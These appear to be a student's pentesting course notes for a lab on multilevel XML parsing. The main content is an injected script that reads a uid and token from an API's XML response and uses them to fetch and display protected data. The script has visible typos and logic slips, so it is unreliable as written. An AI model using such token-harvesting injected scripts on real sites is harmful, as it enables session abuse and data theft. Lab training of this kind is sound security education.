                    Javascript For Pentesters
                    Course Notes Part 6


21 - Multilevel XML parsing
This can be thought of as a natural accompanier to the previous 2 challenges
Again much of the task is the same as previoud with the same qualifications used eg no hardcoding values
You will need to find API and query them.
There is an api endpoints link which gives and XML output
Solution Syntax
  <script>
    var link = document.getElementById(settingd");
    
    // The XHR requests
    var req = new XMLHttpRequest();
    var req2 = new XMLHttpRequest();
    
    var csrf_token = '';
    var uid = '';
    
    // A handler for when the server responds
    req2.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var questions = JSON.parse(req2.responseText);
        document.getElementById("result").innerHTML = questions.q1 + "<br>" +questions.q2 + "<br>" +questions.q3;
      }
    }
    
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        uid = req.responseXML.getElementsByTagName("uid-param-value")[0].childNodes[0].nodeValue;
        token = req.responseXML.getElementsByTagName("token-param-value")[0].childNodes[0].nodeValue;
        
        req2.open("GET", "lab url /questions?uid="+uid+"&token="+token, true);
        req2.send();
      }
    };
    
    req.open("GET", link.href, true);
    req.send();
  </script>

